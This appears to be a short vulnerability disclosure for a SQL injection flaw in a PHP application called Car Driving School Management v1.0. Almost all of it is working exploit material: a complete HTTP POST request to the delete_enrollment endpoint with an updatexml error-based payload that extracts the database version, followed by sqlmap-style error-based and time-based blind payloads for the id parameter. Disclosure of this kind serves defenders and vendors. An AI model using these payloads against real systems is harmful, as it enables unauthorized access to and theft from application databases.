# The parameter on Car Driving School Management v1.0


```sql
POST /cdsms/classes/Master.php?f=delete_enrollment HTTP/1.1
Host: 192.168.1.19
Content-Length: 64
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/cdsms/admin/?page=enrollees
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=af11d32584nvu0nvjbakb00q8h
Connection: close

id=1' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/159834499-c5a75a37-d93a-4d91-9d00-9d435851c8a6.png)
[+]Payload：
```sql
---
Parameter: id (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(5169,CONCAT(0x5c,0x7171626271,(SELECT (ELT(5169=5169,1))),0x71627a6a71))-- Teqs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9304 FROM (SELECT(SLEEP(5)))gvle)-- cytZ
---
```



参考这个格式：https://github.com/nu11secur1ty/CVE-mitre/tree/main/2022/CVE-2022-24571
